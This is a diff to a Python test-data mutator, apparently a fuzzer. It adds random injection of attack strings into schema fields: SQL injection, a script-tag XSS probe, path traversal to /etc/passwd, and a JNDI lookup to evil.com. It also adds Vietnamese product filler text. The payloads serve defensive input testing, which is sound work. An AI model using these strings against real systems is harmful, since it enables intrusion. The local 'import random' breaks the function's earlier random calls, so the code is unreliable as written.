@@ -110,6 +110,18 @@ class GuidedMutator:
     @staticmethod
     def _fallback_mutate_string(values: dict, field: dict, target_val: Any):
         name = field["name"]
+        
+        # 10% chance to inject security payload
+        if random.random() < 0.10:
+            payloads = ["' OR 1=1; --", "admin'--", "<script>alert(1)</script>", "../../../../etc/passwd", "${jndi:ldap://evil.com}"]
+            values[name] = random.choice(payloads)
+            return
+            
+        # 5% chance to inject empty or null
+        if random.random() < 0.05:
+            values[name] = random.choice(["", None, "   "])
+            return
+            
         min_l = field.get("minLength")
         max_l = field.get("maxLength")
         
@@ -128,8 +140,49 @@ class GuidedMutator:
         if target_len <= 0:
             values[name] = ""
         else:
-            chars = string.ascii_letters + string.digits
-            values[name] = "".join(random.choice(chars) for _ in range(target_len))
+            try:
+                from faker import Faker
+                import random
+                
+                # Check for regex/pattern rules first
+                pattern = field.get("pattern") or field.get("regex")
+                if pattern:
+                    import rstr
+                    str_val = rstr.xeger(pattern)
+                else:
+                    fake = Faker(['vi_VN', 'en_US'])
+                    fname = name.lower()
+                    
+                    if "product" in fname or "item" in fname:
+                        products = ["Điện thoại thông minh", "Laptop mỏng nhẹ", "Tai nghe không dây", "Bàn phím cơ", "Chuột Bluetooth", "Màn hình cong", "Sạc dự phòng", "Đồng hồ thông minh", "Máy tính bảng", "Loa không dây", "Máy ảnh kỹ thuật số", "Ổ cứng SSD", "Router Wifi", "Máy lọc không khí", "Robot hút bụi"]
+                        str_val = random.choice(products)
+                    elif "name" in fname: str_val = fake.name()
+                    elif "company" in fname: str_val = fake.company()
+                    elif "desc" in fname or "note" in fname:
+                        descs = [
+                            "Sản phẩm thiết kế hiện đại, sang trọng và dễ sử dụng trong mọi điều kiện.",
+                            "Trang bị công nghệ tiên tiến nhất, mang lại hiệu suất vượt trội và ổn định.",
+                            "Chất liệu cao cấp, độ bền bỉ cao, an toàn tuyệt đối cho người sử dụng.",
+                            "Giải pháp tối ưu cho công việc và giải trí hàng ngày của bạn.",
+                            "Được tích hợp nhiều tính năng thông minh, đem đến trải nghiệm hoàn hảo.",
+                            "Sản phẩm đang được ưa chuộng và đánh giá cao bởi cộng đồng người dùng."
+                        ]
+                        str_val = random.choice(descs)
+                        while len(str_val) < target_len:
+                            str_val += " " + random.choice(descs)
+                    else: str_val = fake.word() + " " + fake.word()
+                
+                if len(str_val) > target_len:
+                    str_val = str_val[:target_len]
+                elif len(str_val) < target_len:
+                    padding_words = [" cao cấp", " chính hãng", " tuyệt vời", " mới", " siêu bền"]
+                    while len(str_val) < target_len:
+                        str_val += random.choice(padding_words)
+                    str_val = str_val[:target_len]
+                values[name] = str_val
+            except:
+                chars = string.ascii_letters + string.digits
+                values[name] = "".join(random.choice(chars) for _ in range(target_len))
 
     @staticmethod
     def _mutate_enum(values: dict, field: dict):
@@ -153,6 +206,18 @@ class GuidedMutator:
         if not schema: return
         field = random.choice(schema)
         name = field["name"]
+        
+        # 10% chance to inject security payload
+        if random.random() < 0.10:
+            payloads = ["' OR 1=1; --", "admin'--", "<script>alert(1)</script>", "../../../../etc/passwd", "${jndi:ldap://evil.com}"]
+            values[name] = random.choice(payloads)
+            return
+            
+        # 5% chance to inject empty or null
+        if random.random() < 0.05:
+            values[name] = random.choice(["", None, "   "])
+            return
+            
         ftype = field.get("type", "string")
         if ftype == "number":
             values[name] = random.randint(-100, 100)
